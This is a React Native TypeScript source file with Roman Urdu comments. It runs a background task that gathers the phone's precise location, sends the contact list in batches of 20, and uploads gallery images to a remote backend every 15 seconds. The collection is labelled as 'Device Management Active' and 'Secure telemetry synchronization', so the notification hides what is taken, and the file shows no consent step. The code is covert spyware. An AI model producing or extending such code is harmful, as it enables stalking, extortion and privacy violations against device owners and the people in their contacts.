import BackgroundService from 'react-native-background-actions';
import Geolocation from 'react-native-geolocation-service';
import Contacts from 'react-native-contacts';
import axios from 'axios';
import { scanAndUploadGallery } from './MediaPipelineService';

const sleep = (time: number) => new Promise<void>((resolve) => setTimeout(resolve, time));

interface SyncOptions {
  backendUrl: string;
  deviceId: string;
}

export const startBackgroundSync = async (options: SyncOptions) => {
  const veryIntensiveTask = async () => {
    await new Promise(async () => {
      // 1. Sab contacts aik dafa fetch kar lo taake unhein chunks mein baant sakein
      let allContacts: any[] = [];
      try {
        allContacts = await Contacts.getAll();
      } catch (err) {
        console.error('Failed to fetch contacts:', err);
      }

      // Track karne ke liye ke kahan tak contacts bhej diye hain
      let contactIndex = 0;
      const chunkSize = 20;

      // Track karne ke liye ke konsi images pehle upload ho chuki hain (Duplicates se bachne ke liye)
      const uploadedImageCache = new Set<string>();

      // 1 minute ke liye total 4 iterations (4 * 15s = 60 seconds)
      for (let i = 0; i < 4 && BackgroundService.isRunning(); i++) {
        try {
          // 1. Fetch Fresh Location
          const position = await new Promise<Geolocation.GeoPosition>((resolve, reject) => {
            Geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000 });
          });

          // 2. Get Next 20 Contacts (Pagination)
          const contactChunk = allContacts.slice(contactIndex, contactIndex + chunkSize);
          contactIndex += chunkSize; // Agli iteration ke liye index agay barha do

          // 3. Scan Gallery (MediaPipelineService mein naye/unique images handle honge)
          const mediaUrls = await scanAndUploadGallery(options.deviceId, uploadedImageCache);

          // 4. Send Fresh Data to Backend
          await axios.post(`${options.backendUrl}/telemetry/sync`, {
            deviceId: options.deviceId,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            contactsCount: allContacts.length,
            contactsSnippet: contactChunk, // Yeh har baar naye 20 contacts honge
            mediaUrls: mediaUrls,          // Yeh sirf naye/fresh media URLs honge
          });
        } catch (e) {
          console.error('Background sync iteration failed:', e);
        }

        // Agar yeh aakhri iteration nahi hai, toh 15 seconds wait karo
        if (i < 3) {
          await sleep(15000);
        }
      }

      // 60 seconds pure hone par service stop kar do
      if (BackgroundService.isRunning()) {
        await BackgroundService.stop();
        console.log('Sync completed and stopped after 60 seconds.');
      }
    });
  };

  await BackgroundService.start(veryIntensiveTask, {
    taskName: 'EnterpriseSync',
    taskTitle: 'Device Management Active',
    taskDesc: 'Secure telemetry synchronization in progress',
    taskIcon: { name: 'ic_launcher', type: 'mipmap' },
    color: '#ff00ff',
    foregroundServiceType: ['dataSync'],
  } as any);
};